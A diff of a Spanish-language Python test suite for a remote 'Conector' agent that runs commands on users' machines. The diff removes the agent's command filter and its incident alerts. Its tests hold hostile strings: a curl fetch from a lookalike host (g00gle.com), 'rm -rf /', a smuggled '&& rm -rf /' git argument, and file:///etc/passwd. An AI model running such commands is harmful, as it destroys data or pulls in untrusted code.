@@ -61,22 +61,26 @@ class ConectorTest(unittest.TestCase):
         otro.post("/api/auth/register/", json={"nombre": "Luis", "email": "luis@example.com", "password": "Clave123"}, headers=csrf)
         self.assertEqual(otro.post(f"/api/conector/{cid}/ejecutar", json={"linea": "dir"}, headers=csrf).status_code, 404)
 
-    def test_comandos_y_enlaces_peligrosos_no_se_envian(self):
+    def test_en_su_equipo_los_comandos_pasan_sin_advertencias(self):
+        """Con su propio equipo la persona es responsable (Términos, sección 7): nada se bloquea ni se advierte por correo."""
+        from models import Incidente
         token, cid = self.vincular()
         self.equipo.get("/api/conector/agente/esperar", headers={"Authorization": f"Bearer {token}"})
-        for linea in ["rm -rf /", "shutdown now", "curl https://g00gle.com/x.sh -o x.sh"]:
+        lineas = ["rm -rf build", "shutdown now", "curl https://g00gle.com/x.sh -o x.sh"]
+        for linea in lineas:
             r = self.c.post(f"/api/conector/{cid}/ejecutar", json={"linea": linea}, headers=self.c.csrf)
-            self.assertEqual(r.status_code, 403, linea)
-            self.assertIn("bloqueó", r.get_json()["error"])
-        self.assertEqual(rc._colas.get(cid, []), [])
+            self.assertEqual(r.status_code, 200, linea)
+        self.assertEqual([o.get("linea") for o in rc._colas.get(cid, [])], lineas)
+        self.assertEqual(Incidente.query.count(), 0)
+        self.assertEqual(self.app.extensions.get("correos_enviados", []) and [c for c in self.app.extensions["correos_enviados"] if "Infracción" in c["asunto"]], [])
 
-    def test_el_programa_descargado_trae_el_filtro(self):
+    def test_el_programa_descargado_no_filtra_comandos(self):
         r = self.c.get("/api/conector/programa")
         self.assertIn(f'filename="codigocamp-conector-v{rc.VERSION_CONECTOR}.py"', r.headers["Content-Disposition"])   # nunca choca con uno viejo
         self.assertEqual(self.c.get("/api/conector/").get_json()["archivo"], f"codigocamp-conector-v{rc.VERSION_CONECTOR}.py")
         texto = r.get_data(as_text=True)
-        self.assertIn("def revisar_comando", texto)
-        self.assertIn("REVISAR_COMANDO = revisar_comando", texto)
+        self.assertIn("REVISAR_COMANDO = None", texto)          # en el equipo de la persona no se filtran comandos
+        self.assertNotIn("def revisar_comando", texto)
         self.assertNotIn("%SERVIDOR%", texto)
         compile(texto, "conector", "exec")
 
@@ -92,11 +96,25 @@ class ConectorTest(unittest.TestCase):
         self.assertEqual((o["tipo"], o["accion"], o["ignorar"]), ("fs", "listar", ["node_modules"]))
         self.equipo.post("/api/conector/agente/salida", json={"orden": o["id"], "fin": True, "codigo": 0, "datos": {"archivos": [{"ruta": "a.py", "tamano": 1, "modificado": 5}]}}, headers=auth)
         self.assertEqual(self.c.get(f"/api/conector/orden/{o['id']}").get_json()["datos"]["archivos"][0]["ruta"], "a.py")
-        for cuerpo, estado in [({"accion": "formatear"}, 400), ({"accion": "git", "args": ["clean", "-fdx", "&& rm -rf /"]}, 403),
-                               ({"accion": "git", "args": "status"}, 400), ({"accion": "escribir", "ruta": "x", "b64": "a" * (rc.MAX_ESCRIBIR + 1)}, 413),
-                               ({"accion": "leer_varios", "rutas": ["a"] * 501}, 400)]:
+        for cuerpo, estado in [({"accion": "formatear"}, 400), ({"accion": "git", "args": "status"}, 400), ({"accion": "escribir", "ruta": "x", "b64": "a" * (rc.MAX_ESCRIBIR + 1)}, 413),
+                               ({"accion": "leer_varios", "rutas": ["a"] * 5001}, 400)]:
             self.assertEqual(self.c.post(f"/api/conector/{cid}/fs", json=cuerpo, headers=self.c.csrf).status_code, estado, cuerpo)
         self.assertEqual(self.c.post(f"/api/conector/{cid}/fs", json={"accion": "git", "args": ["status", "--porcelain=v1"]}, headers=self.c.csrf).status_code, 200)
+
+    def test_cliente_http_hacia_el_equipo(self):
+        """El cliente HTTP de Trabajo llega a la API que corre en el equipo: el servidor reenvía la petición al Conector."""
+        token, cid = self.vincular()
+        auth = {"Authorization": f"Bearer {token}"}
+        self.equipo.get("/api/conector/agente/esperar", headers=auth)
+        r = self.c.post(f"/api/conector/{cid}/fs", json={"accion": "http", "metodo": "post", "url": "http://localhost:5000/api/x",
+                        "cabeceras": [["Content-Type", "application/json"]], "cuerpo_b64": "e30=", "verificar": False}, headers=self.c.csrf)
+        self.assertEqual(r.status_code, 200)
+        o = self.equipo.get("/api/conector/agente/esperar", headers=auth).get_json()["ordenes"][0]
+        self.assertEqual((o["accion"], o["metodo"], o["url"], o["cabeceras"], o["cuerpo_b64"], o["verificar"]),
+                         ("http", "POST", "http://localhost:5000/api/x", [["Content-Type", "application/json"]], "e30=", False))
+        for cuerpo, estado in [({"accion": "http", "metodo": "TRACE", "url": "http://localhost/"}, 400), ({"accion": "http", "url": "file:///etc/passwd"}, 400),
+                               ({"accion": "http", "url": "http://x/", "cabeceras": "malas"}, 400), ({"accion": "http", "url": "http://x/", "cuerpo_b64": "a" * 3_000_001}, 413)]:
+            self.assertEqual(self.c.post(f"/api/conector/{cid}/fs", json=cuerpo, headers=self.c.csrf).status_code, estado, cuerpo)
 
     def test_terminal_real_del_equipo(self):
         token, cid = self.vincular()
@@ -142,7 +160,7 @@ class ConectorTest(unittest.TestCase):
         self.assertEqual(self.equipo.get("/api/conector/agente/version", headers=auth).get_json()["version"], rc.VERSION_CONECTOR)
         prog = self.equipo.get("/api/conector/agente/programa", headers=auth).get_data(as_text=True)
         self.assertIn(f"VERSION_CONECTOR = {rc.VERSION_CONECTOR}", prog)
-        self.assertIn("REVISAR_COMANDO = revisar_comando", prog)
+        self.assertIn("REVISAR_COMANDO = None", prog)
         self.assertEqual(self.equipo.get("/api/conector/agente/programa").status_code, 401)
         # el nuevo informa que trae la terminal completa
         self.equipo.post("/api/conector/agente/estado", json={"antivirus": {}, "version": rc.VERSION_CONECTOR, "capacidades": ["pty"]}, headers=auth)
